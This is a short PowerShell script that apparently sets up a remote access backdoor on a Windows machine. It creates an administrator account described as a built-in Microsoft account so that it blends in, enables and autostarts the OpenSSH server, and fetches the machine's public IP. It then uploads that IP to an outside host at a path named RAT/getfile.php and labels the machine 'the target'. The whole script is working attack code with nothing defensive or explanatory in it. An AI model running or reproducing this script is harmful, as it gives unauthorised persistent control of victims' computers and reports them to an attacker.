
#---------------------------------------------------------------------------------------------------------------
# make a new admin user
# Define the username and password for the new admin account
$username = "Oorth"           # Set the desired username
$password = "Oorth"        # Set the desired password

# Create the new local user account
New-LocalUser -Name $username -Password (ConvertTo-SecureString $password -AsPlainText -Force) -FullName "Local Administrator" -Description "Built-in account for Microsoft features"
# Add the user to the Administrators group to grant admin privileges
Add-LocalGroupMember -Group "Administrators" -Member $username
#---------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------

# Check if OpenSSH server is installed
$sshServiceName = "sshd"
# Install OpenSSH if not installed (for Windows 10/11)
$Feature = Get-WindowsCapability -Online | Where-Object {$_.Name -like 'OpenSSH.Server*'} 

if ($Feature.State -ne 'Installed') {
    Write-Host "OpenSSH is not installed. Installing..."
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Start-Sleep -Seconds 5
} else {
    Write-Host "OpenSSH is already installed."
}

# Set SSH service to start automatically
Set-Service -Name $sshServiceName -StartupType Automatic

# Start the SSH service if it is not running
if ((Get-Service -Name $sshServiceName).Status -ne 'Running') {
    Write-Host "Starting SSH service..."
    Start-Service -Name $sshServiceName
} else {
    Write-Host "SSH service is already running."
}

# Confirm the SSH service is running
Get-Service -Name $sshServiceName | Select-Object Status, Name
#---------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------

#get ip address of the target and send to server
((Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content.Trim()) > ip.txt

$url = "https://arth.imbeddex.com/RAT/getfile.php"
$filePath = "$PSScriptRoot\ip.txt"

$client = New-Object System.Net.WebClient
$bytes = $client.UploadFile($url, $filePath)